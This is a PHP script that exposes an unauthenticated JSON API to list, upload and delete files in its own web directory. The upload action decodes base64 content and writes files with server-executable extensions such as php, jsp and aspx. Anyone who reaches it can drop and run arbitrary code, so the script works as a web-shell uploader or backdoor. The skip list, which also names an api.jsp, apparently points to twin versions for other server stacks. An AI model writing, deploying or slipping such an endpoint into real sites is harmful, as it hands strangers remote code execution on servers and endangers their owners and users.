<?php
header('Content-Type: application/json; charset=utf-8');
$dir = __DIR__;
$action = $_GET['action'] ?? 'list';
$skip = ['api.php', 'api.jsp', 'index.html', 'README.md'];

switch ($action) {
    case 'list':
        $files = [];
        foreach (scandir($dir) as $name) {
            $path = $dir . '/' . $name;
            if (!is_file($path) || in_array($name, $skip) || str_starts_with($name, '.')) continue;
            $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
            if (!$ext) continue;
            $files[] = [
                'name' => $name,
                'size' => filesize($path),
                'modified' => date('Y-m-d H:i:s', filemtime($path)),
            ];
        }
        echo json_encode(['files' => $files]);
        break;

    case 'upload':
        $input = json_decode(file_get_contents('php://input'), true);
        if (!$input || empty($input['name']) || !isset($input['content'])) {
            echo json_encode(['error' => 'invalid request']);
            break;
        }
        $name = basename($input['name']);
        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        $allowed = ['php', 'jsp', 'jspx', 'asp', 'aspx', 'txt', 'html'];
        if (!in_array($ext, $allowed)) {
            echo json_encode(['error' => 'unsupported type']);
            break;
        }
        $target = $dir . '/' . $name;
        $content = base64_decode($input['content']);
        if (file_put_contents($target, $content) !== false) {
            echo json_encode(['success' => true, 'name' => $name]);
        } else {
            echo json_encode(['error' => 'write failed']);
        }
        break;

    case 'delete':
        $input = json_decode(file_get_contents('php://input'), true);
        if (!$input || empty($input['name'])) {
            echo json_encode(['error' => 'invalid request']);
            break;
        }
        $name = basename($input['name']);
        if (in_array($name, $skip)) {
            echo json_encode(['error' => 'protected file']);
            break;
        }
        $target = $dir . '/' . $name;
        if (is_file($target) && unlink($target)) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'delete failed']);
        }
        break;

    default:
        echo json_encode(['error' => 'unknown action']);
}
